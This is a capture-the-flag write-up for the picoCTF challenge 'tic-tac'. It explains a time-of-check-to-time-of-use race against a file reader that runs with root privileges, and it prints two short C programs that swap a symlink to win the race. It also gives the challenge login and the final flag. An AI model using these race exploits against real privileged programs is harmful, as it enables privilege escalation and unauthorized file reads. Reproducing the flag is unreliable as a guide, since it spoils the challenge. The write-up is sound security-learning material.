# tic-tac

**200 points**

AUTHOR: JUNIAS BONOU

Description
Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
ssh to saturn.picoctf.net:50591, and run the binary named "txtreader" once connected. Login as ctf-player with the password, d8819d45

*Note:* This challenge launches an instance on demand.

___

I don't want to curse but I hate this challenge.

I tried every possible idea with this symbolic linking script that is the only one on the internet and nothing else.

```cpp
#include <stdio.h>
#include<unistd.h>
#include <string.h>

int main(int argc, char * argv[]){
  unlink(argv[1]);
  symlink("/home/ctf-player/flag.txt",argv[1]);
}
```

But this is just **NOT FAST ENOUGH APPERANTLY**

Thank god `LiveOverflow` exists because after scraping the web with the utmost of `sus` google searches that probably put me on a list I found his video, directly solving this question [https://www.youtube.com/watch?v=5g137gsB9Wk&ab_channel=LiveOverflow](https://www.youtube.com/watch?v=5g137gsB9Wk&ab_channel=LiveOverflow) (you could skip this writeup and watch his video).

My explanation:

We want to create race conditions, such that the command execution would be like so:

```
--> Be a root file
--> Get checked by the programs if:
        // Check the file's owner.
        if (statbuf.st_uid != getuid()) {
            std::cerr << "Error: you don't own this file" << std::endl;
            return 1;
        }
--> Become readable with symbolic link
--> Get opened and read by the program:
        // Read the contents of the file.
        if (file.is_open()) {
            std::string line;
            while (getline(file, line)) {
            std::cout << line << std::endl;
            }
        } else {
            std::cerr << "Error: Could not open file" << std::endl;
            return 1;
        }
```

Instead of the code I showed above, there is a faster built in way in linux that this hidden from the internet does:

```cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

Running this script on two files, one with symbolic link to the flag and another user-made file tricks the reader program when it tried to read the symbolic-link file to print out the flag if you're lucky (just a few reruns needed).

And so:

> picoCTF{ToctoU_!s_3a5y_5748402c}
